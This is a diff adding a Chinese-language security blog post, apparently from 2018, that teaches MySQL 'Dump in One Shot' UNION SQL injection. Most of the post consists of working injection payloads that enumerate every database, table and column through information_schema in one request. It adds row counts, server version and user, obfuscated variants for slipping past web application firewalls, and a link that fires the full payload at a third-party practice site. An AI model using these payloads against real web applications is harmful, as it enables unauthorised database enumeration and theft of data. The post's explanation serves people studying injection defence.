@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+    <!--baidu-site-verification-->
+    
+        <meta name="baidu-site-verification" content="UAvChuZhGT" />
+    
+
+    <!--google-site-verification-->
+    
+        <meta name="google-site-verification" content="Z-s1tzkNvOFbS6qprnYzpvlt_7EK4mXhJaPAjYwvch0" />
+    
+
+    <!--Description-->
+    
+        <meta name="description" content="Dump In One Shot(DIOS)使用一条SQL语句，一次HTTP请求注入出数据库所有库名-表名-列名，以及一些数据库基本信息本文记录一下基于MySQL UNION Injection的DIOS技术使用DIOS要注意的mysql函数：CONCAT()：将参数连接返回连接后字符串，当任意参数为NULL时，则返回NULLGROUP_CONCAT()：将字段值拼接为一行返回，默认长度限制为1024
+0x00 首先来看一个用来获取所有数据库的查询语句1(select (@x) from (select(@x:=0x00),(select (@x) from (information_schema.schemata)where (@x)in (@x:=concat(@x,schema_name,&amp;apos;&amp;lt;br&amp;gt;&amp;apos;))))x)
+
+上面的sql，在一行中返回了所有数据库名。">
+    
+
+    <!--Keywords-->
+    
+        <meta name="keywords" content="小程序,小程序安全,前端安全,web安全,sqli,MySQL,DIOS,Dump in One shot,Sedate,个人博客,技术博客,渗透测试,Web安全,编程开发">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="Sedate">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="MySQL DIOS(Dump in One Shot) UNION Injection"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta name="og:description" content="Dump In One Shot(DIOS)使用一条SQL语句，一次HTTP请求注入出数据库所有库名-表名-列名，以及一些数据库基本信息本文记录一下基于MySQL UNION Injection的DIOS技术使用DIOS要注意的mysql函数：CONCAT()：将参数连接返回连接后字符串，当任意参数为NULL时，则返回NULLGROUP_CONCAT()：将字段值拼接为一行返回，默认长度限制为1024
+0x00 首先来看一个用来获取所有数据库的查询语句1(select (@x) from (select(@x:=0x00),(select (@x) from (information_schema.schemata)where (@x)in (@x:=concat(@x,schema_name,&amp;apos;&amp;lt;br&amp;gt;&amp;apos;))))x)
+
+上面的sql，在一行中返回了所有数据库名。">
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="[Sedate@0x00]$ su - root"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>MySQL DIOS(Dump in One Shot) UNION Injection - [Sedate@0x00]$ su - root</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    Home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    Archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories">
+                    Categories
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/tags">
+                    Tags
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact.html">
+                    Contact
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    About
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/MySQL-DIOS-Dump-in-One-Shot-UNION-Injection.html">
+                MySQL DIOS(Dump in One Shot) UNION Injection
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2018-07-21</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/Sec/">Sec</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <h3 id="Dump-In-One-Shot-DIOS"><a href="#Dump-In-One-Shot-DIOS" class="headerlink" title="Dump In One Shot(DIOS)"></a>Dump In One Shot(DIOS)</h3><p>使用一条SQL语句，一次HTTP请求注入出数据库所有库名-表名-列名，以及一些数据库基本信息<br>本文记录一下基于MySQL UNION Injection的DIOS技术<br><br>使用DIOS要注意的mysql函数：<br>CONCAT()：将参数连接返回连接后字符串，<font color="red">当任意参数为NULL时，则返回NULL</font><br>GROUP_CONCAT()：将字段值拼接为一行返回，<font color="red">默认长度限制为1024</font></p>
+<h3 id="0x00-首先来看一个用来获取所有数据库的查询语句"><a href="#0x00-首先来看一个用来获取所有数据库的查询语句" class="headerlink" title="0x00 首先来看一个用来获取所有数据库的查询语句"></a>0x00 首先来看一个用来获取所有数据库的查询语句</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select (@x) from (select(@x:=0x00),(select (@x) from (information_schema.schemata)where (@x)in (@x:=concat(@x,schema_name,&apos;&lt;br&gt;&apos;))))x)</span><br></pre></td></tr></table></figure>
+<img src="/MySQL-DIOS-Dump-in-One-Shot-UNION-Injection/image.png">
+<p><br>上面的sql，在一行中返回了所有数据库名。<br><br><a id="more"></a><br><img src="/MySQL-DIOS-Dump-in-One-Shot-UNION-Injection/image1.png"><br>通过group_concat()也能实现此操作，<font color="red">但是group_concat()不允许超过1024个字符，无法获取大量数据。</font></p>
+<h3 id="0x01-接下来看看它的实现原理"><a href="#0x01-接下来看看它的实现原理" class="headerlink" title="0x01 接下来看看它的实现原理"></a>0x01 接下来看看它的实现原理</h3><p>(@x:=concat(@x,schema_name,’&lt;br&gt;’)<br>首先最内层，将变量@x与schema_name，&lt;br&gt;进行拼接后赋值到@x中</p>
+<h4 id="1）使用个例子来看一下这条语句执行结果"><a href="#1）使用个例子来看一下这条语句执行结果" class="headerlink" title="1）使用个例子来看一下这条语句执行结果"></a>1）使用个例子来看一下这条语句执行结果</h4><img src="/MySQL-DIOS-Dump-in-One-Shot-UNION-Injection/image2.png">
+<h5 id="1-1）先使用select-x-声明个变量"><a href="#1-1）先使用select-x-声明个变量" class="headerlink" title="1.1）先使用select @x; 声明个变量"></a>1.1）先使用select @x; 声明个变量</h5><h5 id="1-2）在利用此变量与schema-name字段值进行拼接"><a href="#1-2）在利用此变量与schema-name字段值进行拼接" class="headerlink" title="1.2）在利用此变量与schema_name字段值进行拼接"></a>1.2）在利用此变量与schema_name字段值进行拼接</h5><p><font color="red">但是返回结果却是NULL，文章开始提到concat()函数中任意参数为NULL时，都会返回NULL，<br>而select @x 声明的变量默认为NULL，所有当使用值为NULL的@x拼接时都会返回NULL</font><br></p>
+<h4 id="2）我们在声明变量时为他赋个值再看一下结果"><a href="#2）我们在声明变量时为他赋个值再看一下结果" class="headerlink" title="2）我们在声明变量时为他赋个值再看一下结果"></a>2）我们在声明变量时为他赋个值再看一下结果</h4><img src="/MySQL-DIOS-Dump-in-One-Shot-UNION-Injection/image3.png"> 
+<p><br>可以看到，这次正常返回了所有内容，所以使用concat()函数进行DIOS时，要对变量赋个初始值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select (@x) from (information_schema.schemata)where (@x)in (@x:=concat(@x,schema_name,&apos;&lt;br&gt;&apos;)))</span><br></pre></td></tr></table></figure>
+<p>现在再来看看这条语句，他仅仅是不断将schema_name的值追加到@x中，然后就可以通过@x来获取结果了</p>
+<img src="/MySQL-DIOS-Dump-in-One-Shot-UNION-Injection/image4.png"> 
+<p><br>将图中两步结合起来就得到文章开始提到的查询所有数据库的语句了，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select (@x) from (select(@x:=0x00),(select (@x) from (information_schema.schemata)where (@x)in (@x:=concat(@x,schema_name,0x3c62723e))))x)</span><br></pre></td></tr></table></figure></p>
+<img src="/MySQL-DIOS-Dump-in-One-Shot-UNION-Injection/image5.png"> 
+<p><br>在本地环境中看一下实际效果<br><br><img src="/MySQL-DIOS-Dump-in-One-Shot-UNION-Injection/image6.png"> </p>
+<h3 id="0x02-更多语句"><a href="#0x02-更多语句" class="headerlink" title="0x02 更多语句"></a>0x02 更多语句</h3><h4 id="1）获取所有表名"><a href="#1）获取所有表名" class="headerlink" title="1）获取所有表名"></a>1）获取所有表名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select (@x) from (select(@x:=0x00),(select (@x) from (information_schema.tables)where (@x)in (@x:=concat(@x,table_name,&apos;&lt;br&gt;&apos;))))x)</span><br></pre></td></tr></table></figure>
+<h4 id="2）获取非information-schema数据库的表"><a href="#2）获取非information-schema数据库的表" class="headerlink" title="2）获取非information_schema数据库的表"></a>2）获取非information_schema数据库的表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select (@x) from (select(@x:=0x00),(select (@x) from (information_schema.tables)where table_schema!=&apos;information_schema&apos; and(@x)in (@x:=concat(@x,table_name,&apos;&lt;br&gt;&apos;))))x)</span><br></pre></td></tr></table></figure>
+<h4 id="3）获取当前数据库的表"><a href="#3）获取当前数据库的表" class="headerlink" title="3）获取当前数据库的表"></a>3）获取当前数据库的表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select (@x) from (select(@x:=0x00),(select (@x) from (information_schema.tables)where table_schema=database() and(@x)in(@x:=concat(@x,table_name,&apos;&lt;br&gt;&apos;))))x)</span><br></pre></td></tr></table></figure>
+<h4 id="4）获取非information-schema数据库的库名与表名"><a href="#4）获取非information-schema数据库的库名与表名" class="headerlink" title="4）获取非information_schema数据库的库名与表名"></a>4）获取非information_schema数据库的库名与表名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select (@x) from (select(@x:=0x00),(select (@x) from (information_schema.tables)where table_schema!=&apos;information_schema&apos; and(@x)in (@x:=concat(@x,table_schema,0x3a,table_name,&apos;&lt;br&gt;&apos;))))x)</span><br></pre></td></tr></table></figure>
+<h4 id="5）获取非information-schema数据库的库名，表名与列名"><a href="#5）获取非information-schema数据库的库名，表名与列名" class="headerlink" title="5）获取非information_schema数据库的库名，表名与列名"></a>5）获取非information_schema数据库的库名，表名与列名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select (@x) from (select(@x:=0x00),(select (@x) from (information_schema.columns)where table_schema!=&apos;information_schema&apos; and(@x)in (@x:=concat(@x,table_schema,&apos; &gt; &apos;,table_name,&apos; &gt; &apos;,column_name,&apos;&lt;br&gt;&apos;))))x)</span><br></pre></td></tr></table></figure>
+<h4 id="6）利用模糊查询根据条件显示"><a href="#6）利用模糊查询根据条件显示" class="headerlink" title="6）利用模糊查询根据条件显示"></a>6）利用模糊查询根据条件显示</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select (@x) from (select(@x:=0x00),(select (@x) from (information_schema.columns)where table_schema!=&apos;information_schema&apos; and table_name like &apos;xxx%&apos; and(@x)in (@x:=concat(@x,table_schema,&apos; &gt; &apos;,table_name,&apos; &gt; &apos;,column_name,&apos;&lt;br&gt;&apos;))))x)</span><br></pre></td></tr></table></figure>
+<h3 id="0x03-获取更完整的信息"><a href="#0x03-获取更完整的信息" class="headerlink" title="0x03 获取更完整的信息"></a>0x03 获取更完整的信息</h3><h4 id="1）使用上面总结的DIOS获取数据库，表名，列名，效果如下"><a href="#1）使用上面总结的DIOS获取数据库，表名，列名，效果如下" class="headerlink" title="1）使用上面总结的DIOS获取数据库，表名，列名，效果如下"></a>1）使用上面总结的DIOS获取数据库，表名，列名，效果如下</h4><img src="/MySQL-DIOS-Dump-in-One-Shot-UNION-Injection/image7.png">
+<p><br>每行都会有数据库名和表名，内容多了很冗余，也不容易看结果<br>我们可以加个条件只输出一次库名与表名，达到如下效果：<br><br><img src="/MySQL-DIOS-Dump-in-One-Shot-UNION-Injection/image8.png"><br>可以看到，结构更清晰了，语句为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select (@x) from (select(@x:=0x00),(@tbl:=0x00),(select (@x) from (information_schema.columns) where (table_schema=database()) and(0x00)in (@x:=concat(@x,0x3c62723e,if( (@tbl!=table_name), Concat(0x3c62723e,table_schema,&apos; :: &apos;,@tbl:=table_name,&apos;&lt;br&gt;&apos;),0x00),column_name))))x)</span><br></pre></td></tr></table></figure></p>
+<p>首先我们加了个变量@tbl并赋一个初始值，用来记录表名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(@x:=concat(@x,0x3c62723e,if( (@tbl!=table_name), Concat(0x3c62723e,table_schema,&apos; :: &apos;,@tbl:=table_name,&apos;&lt;br&gt;&apos;),0x00),column_name))</span><br></pre></td></tr></table></figure></p>
+<p>在concat()里又加了一个if()，用来判断@tbl是否与当前表名相同，如果不同，便追加库名与表名，<br>相同时便无需重复追加库与表，追加NULL就可以<br><br><img src="/MySQL-DIOS-Dump-in-One-Shot-UNION-Injection/image9.png"><br><img src="/MySQL-DIOS-Dump-in-One-Shot-UNION-Injection/image10.png"><br>对比之前select @x的结果，清晰了许多，这样网站需要响应的数据也少了许多</p>
+<h4 id="2）接下来我们在加上表的数据量统计"><a href="#2）接下来我们在加上表的数据量统计" class="headerlink" title="2）接下来我们在加上表的数据量统计"></a>2）接下来我们在加上表的数据量统计</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select (@x) from (select(@x:=0x00),(@tbl:=0x00),(@tbl_sc:=0x00),(select (@x) from (information_schema.columns) where (table_schema=database()) and(0x00)in (@x:=concat(@x,0x3c62723e,if( (@tbl!=table_name), Concat(0x3c62723e,@tbl_sc:=table_schema,&apos; :: &apos;,@tbl:=table_name,&apos;(Rows &apos;,(select table_rows from information_schema.tables where table_schema=@tbl_sc and table_name=@tbl),&apos;)&lt;br&gt;&apos;),0x00),column_name))))x)</span><br></pre></td></tr></table></figure>
+<p>在上一条语句基础上又增加了一个@tbl_sc变量，用来记录当前数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Rows &apos;,(select table_rows from information_schema.tables where table_schema=@tbl_sc and table_name=@tbl),&apos;)&lt;br&gt;&apos;</span><br></pre></td></tr></table></figure></p>
+<p>concat()里增加了这一条语句，根据@tbl_sc与@tbl查找table_rows并追加<br><br><img src="/MySQL-DIOS-Dump-in-One-Shot-UNION-Injection/image11.png"></p>
+<h4 id="3）我们继续为结果加上序号"><a href="#3）我们继续为结果加上序号" class="headerlink" title="3）我们继续为结果加上序号"></a>3）我们继续为结果加上序号</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select (@x) from (select(@x:=0x00),(@tbl:=0x00),(@tbl_sc:=0x00),(@num:=0),(select (@x) from (information_schema.columns) where (table_schema=database()) and(0x00)in (@x:=concat(@x,0x3c62723e,if( (@tbl!=table_name), Concat(0x3c62723e,@num:=(@num+1),0x2920,@tbl_sc:=table_schema,&apos; :: &apos;,@tbl:=table_name,&apos; (Rows &apos;,(select table_rows from information_schema.tables where table_schema=@tbl_sc and table_name=@tbl),&apos;)&lt;br&gt;&apos;),0x00),column_name))))x)</span><br></pre></td></tr></table></figure>
+<p>增加一个@num变量，在concat()中每次追加时都+1<br><br><img src="/MySQL-DIOS-Dump-in-One-Shot-UNION-Injection/image12.png"></p>
+<h4 id="4）bypass"><a href="#4）bypass" class="headerlink" title="4）bypass"></a>4）bypass</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%63oncat%0a/*!(%75nhex%0a(%68ex%0a(%0a(/*!12345%73elEcT*/(@x)/*!12345%66rom*/(/*!12345%73elEcT*/(@x:=0x00),(@tbl:=0x00),(@tbl_sc:=0x00),(@num:=0),(/*!12345%73elEcT*/(@x)/*!12345%66rom*/(/*!12345`%69nformation_%73chema`.`%63olumns`*/)%77here (`%74able_schema`=%64atabase%0a())and(0x00)in(@x:=%63oncat%0a/*!(@x,0x3c62723e,if( (@tbl!=/*!12345`table_name`*/), %43oncat%0a(0x3c62723e,@num:=(@num%2b1),0x2920,@tbl_sc:=`table_schema`,0x203a3a20,@tbl:=`%74able_name`,0x2028526f777320,(/*!12345%73elEcT*/`table_rows`from/*!12345`%69nformation_schema`.`tables`*/where table_schema=@tbl_sc and/*!12345`%74able_name`*/=@tbl),0x293c62723e),0x00),(/*!12345`%63olumn_name`*/)))))x))))</span><br></pre></td></tr></table></figure>
+<h4 id="5）增加数据库各信息与显示样式"><a href="#5）增加数据库各信息与显示样式" class="headerlink" title="5）增加数据库各信息与显示样式"></a>5）增加数据库各信息与显示样式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">COncaT%0a/*!(%75nhex%0a(%68ex%0a(COncaT%0a/*!(0x3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e3c62723e3c62723e3c2f63656e7465723e3c2f6469763e3c2f6469763e3c2f7461626c653e,0x223e,0x273e,0x3c62723e3c62723e,%75nhex%0a(%68ex%0a(%63oncat%0a/*!(0x3c666f6e7420636f6c6f723d7265643e3c623e3c68323e4d7953514c2044494f53204279205365646174653c2f68323e3c2f623e3c2f666f6e743e3c62723e))),0x3c666f6e7420636f6c6f723d677265656e3e4d7953514c2056657273696f6e203a3a203c2f666f6e743e,version(),0x7e20,@@version_comment,0x3c62723e3c666f6e7420636f6c6f723d677265656e3e5072696d617279204461746162617365203a3a203c2f666f6e743e,database(),0x3c62723e3c666f6e7420636f6c6f723d22677265656e223e44617461626173652055736572203a3a203c2f666f6e743e,user(),(/*!12345%73elEcT*/(@x)/*!12345%66rom*/(/*!12345%73elEcT*/(@x:=0x00),(@tbl:=0x00),(@tbl_sc:=0x00),(@num:=0),(/*!12345%73elEcT*/(@x)/*!12345%66rom*/(/*!12345`%69nformation_%73chema`.`%63olumns`*/)%77here%20(`%74able_schema`=%64atabase%0a())and(0x00)in(@x:=%63oncat%0a(@x,0x3c62723e,if(%20(@tbl!=/*!12345`table_name`*/),%20%43oncat%0a(0x3c2f666f6e743e3c666f6e7420636f6c6f723d477265656e3e3c62723e,@num:=(@num%2b1),0x29203c666f6e7420636f6c6f723d2723463746453245273e204461746162617365203a20,@tbl_sc:=`table_schema`,0x205b205461626c65204e616d65203a20,@tbl:=`%74able_name`,0x5d2028526f777320,(/*!12345%73elEcT*/`table_rows`from/*!12345`%69nformation_schema`.`tables`*/where%20table_schema=@tbl_sc%20and/*!12345`%74able_name`*/=@tbl),0x293c666f6e7420636f6c6f723d7265643e3c62723e),0x00),concat%0a(/*!12345`%63olumn_name`*/)))))x)))))</span><br></pre></td></tr></table></figure>
+<p>实例：<a href="http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1%27%20union%20select%201,COncaT%0a/*!(%75nhex%0a(%68ex%0a(COncaT%0a/*!(0x3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e3c62723e3c62723e3c2f63656e7465723e3c2f6469763e3c2f6469763e3c2f7461626c653e,0x223e,0x273e,0x3c62723e3c62723e,%75nhex%0a(%68ex%0a(%63oncat%0a/*!(0x3c666f6e7420636f6c6f723d7265643e3c623e3c68323e4d7953514c2044494f53204279205365646174653c2f68323e3c2f623e3c2f666f6e743e3c62723e%29%29%29,0x3c666f6e7420636f6c6f723d677265656e3e4d7953514c2056657273696f6e203a3a203c2f666f6e743e,version(%29,0x7e20,@@version_comment,0x3c62723e3c666f6e7420636f6c6f723d677265656e3e5072696d617279204461746162617365203a3a203c2f666f6e743e,database(%29,0x3c62723e3c666f6e7420636f6c6f723d22677265656e223e44617461626173652055736572203a3a203c2f666f6e743e,user(%29,(/*!12345%73elEcT*/(@x%29/*!12345%66rom*/(/*!12345%73elEcT*/(@x:=0x00%29,(@tbl:=0x00%29,(@tbl_sc:=0x00%29,(@num:=0%29,(/*!12345%73elEcT*/(@x%29/*!12345%66rom*/(/*!12345`%69nformation_%73chema`.`%63olumns`*/%29%77here%20(`%74able_schema`=%64atabase%0a(%29%29and(0x00%29in(@x:=%63oncat%0a(@x,0x3c62723e,if(%20(@tbl!=/*!12345`table_name`*/%29,%20%43oncat%0a(0x3c2f666f6e743e3c666f6e7420636f6c6f723d477265656e3e3c62723e,@num:=(@num%2b1%29,0x29203c666f6e7420636f6c6f723d2723463746453245273e204461746162617365203a20,@tbl_sc:=`table_schema`,0x205b205461626c65204e616d65203a20,@tbl:=`%74able_name`,0x5d2028526f777320,(/*!12345%73elEcT*/`table_rows`from/*!12345`%69nformation_schema`.`tables`*/where%20table_schema=@tbl_sc%20and/*!12345`%74able_name`*/=@tbl%29,0x293c666f6e7420636f6c6f723d7265643e3c62723e%29,0x00%29,concat%0a(/*!12345`%63olumn_name`*/%29%29%29%29%29x%29%29%29%29%29,3%23%29" target="_blank" rel="noopener">查看实例</a><br><br><img src="/MySQL-DIOS-Dump-in-One-Shot-UNION-Injection/image13.png"></p>
+<h3 id="0x04-其他DIOS利用姿势"><a href="#0x04-其他DIOS利用姿势" class="headerlink" title="0x04 其他DIOS利用姿势"></a>0x04 其他DIOS利用姿势</h3><h4 id="1）利用export-set"><a href="#1）利用export-set" class="headerlink" title="1）利用export_set()"></a>1）利用export_set()</h4><p>先了解一下这个函数<br><br><img src="/MySQL-DIOS-Dump-in-One-Shot-UNION-Injection/image14.png"></p>
+<h5 id="1-1）将参数6转为二进制，从右向左（从低位到高位）排序，得到011"><a href="#1-1）将参数6转为二进制，从右向左（从低位到高位）排序，得到011" class="headerlink" title="1.1）将参数6转为二进制，从右向左（从低位到高位）排序，得到011"></a>1.1）将参数6转为二进制，从右向左（从低位到高位）排序，得到011</h5><h5 id="1-2）按照最后一个参数补齐位数：011000"><a href="#1-2）按照最后一个参数补齐位数：011000" class="headerlink" title="1.2）按照最后一个参数补齐位数：011000"></a>1.2）按照最后一个参数补齐位数：011000</h5><h5 id="1-3）1代表第二个参数-y-，0代表第三个参数-n-，第四个参数作为分隔符，得到结果：n-y-y-n-n-n"><a href="#1-3）1代表第二个参数-y-，0代表第三个参数-n-，第四个参数作为分隔符，得到结果：n-y-y-n-n-n" class="headerlink" title="1.3）1代表第二个参数 y ，0代表第三个参数 n ，第四个参数作为分隔符，得到结果：n-y-y-n-n-n"></a>1.3）1代表第二个参数 y ，0代表第三个参数 n ，第四个参数作为分隔符，得到结果：n-y-y-n-n-n</h5><p>使用这个函数可以拼接参数，可以利用它进行DIOS<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Select export_set(5,@x:=0x00,(select count(*)from(information_schema.columns)where table_schema =database() and @x:=export_set(5,export_set(5,@x,table_name,0x3c62723e,2),column_name,0x3e,2)),@x,2))</span><br></pre></td></tr></table></figure></p>
+<img src="/MySQL-DIOS-Dump-in-One-Shot-UNION-Injection/image15.png">
+<h4 id="2）利用make-set"><a href="#2）利用make-set" class="headerlink" title="2）利用make_set()"></a><br>2）利用make_set()</h4><img src="/MySQL-DIOS-Dump-in-One-Shot-UNION-Injection/image16.png">
+<h5 id="1）将参数6转为二进制，从右向左（从低位到高位）排序，得到011"><a href="#1）将参数6转为二进制，从右向左（从低位到高位）排序，得到011" class="headerlink" title="1）将参数6转为二进制，从右向左（从低位到高位）排序，得到011"></a><br>1）将参数6转为二进制，从右向左（从低位到高位）排序，得到011</h5><h5 id="2）011依次对应后面的参数，a对应0-b对应1-c对应1"><a href="#2）011依次对应后面的参数，a对应0-b对应1-c对应1" class="headerlink" title="2）011依次对应后面的参数，a对应0 b对应1 c对应1"></a>2）011依次对应后面的参数，a对应0 b对应1 c对应1</h5><h5 id="3）将对应1的取出，得到结果b，c"><a href="#3）将对应1的取出，得到结果b，c" class="headerlink" title="3）将对应1的取出，得到结果b，c"></a>3）将对应1的取出，得到结果b，c</h5><p>此函数也可以对参数进行拼接并返回一行，利用它进行DIOS语句如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make_set(6,@x:=0x00,(select(1)from(information_schema.columns)where table_schema=database() and @x:=make_set(511,@x,0x3c62723e,table_name,column_name)),@x)</span><br></pre></td></tr></table></figure></p>
+<img src="/MySQL-DIOS-Dump-in-One-Shot-UNION-Injection/image17.png">
+<p><br>511的二进制为：111111111<br>利用make_set(511,str)，可一次获取最多九个列的内容</p>
+<h3 id="0x05-LAST"><a href="#0x05-LAST" class="headerlink" title="0x05 LAST"></a>0x05 LAST</h3><p>当语句没错，而响应结果为空时，可以将<font color="red">table_schema!=’information_schema’</font>替换为<font color="red">table_schema=database()</font>,<br>或者将<font color="red">(Rows’,(select table_rows from information_schema.tables where table_schema=@tbl_sc and table_name=@tbl),’)<br>‘</font>去掉。<br>因为<font color="red">table_rows</font>里会有NULL值，当concat()追加到这个NULL时，整体结果就会返回NULL，<font color="red">table_schema=database()</font>基本没有NULL，<br>或者直接用第二个方法，不去统计表的数据量</p>
+<p><hr><br>有问题欢迎加入QQ群交流：NTUzNzI0NzM3<br>混圈子的“大黑客”，“大水逼”勿扰</p>
+<h5 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a><br><br><br>参考链接</h5><p><a href="http://securityidiots.com/Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-1.html" target="_blank" rel="noopener">DIOS (Dump in One Shot) Explained Part 1</a><br><a href="http://securityidiots.com/Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-2.html" target="_blank" rel="noopener">DIOS (Dump in One Shot) Explained Part 2</a><br><a href="http://securityidiots.com/Web-Pentest/SQL-Injection/DIOS-the-SQL-Injectors-Weapon-Upgraded.html" target="_blank" rel="noopener">DIOS the SQL Injectors Weapon (Upgraded)</a></p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/数据库/">#数据库</a> <a href="/tags/MySQL/">#MySQL</a> <a href="/tags/sqli/">#sqli</a> <a href="/tags/DIOS/">#DIOS</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                <h2>About</h2>
+                <p>
+                    Just do IT.
+                </p>
+            </div>
+            
+    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+            <li>
+                <a class="footer-post" href="/MySQL-DIOS-Dump-in-One-Shot-UNION-Injection.html">MySQL DIOS(Dump in One Sh</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/小程序安全.html">小程序安全</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/hello-world.html">Hello World</a>
+            </li>
+            
+        </ul>
+    </div>
+
+
+
+            
+<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
+    <h2>Categories</h2>
+    <ul>
+        
+        <li>
+            <a class="footer-post" href="/categories/Code/">Code</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/Sec/">Sec</a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/Sedate0x00">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
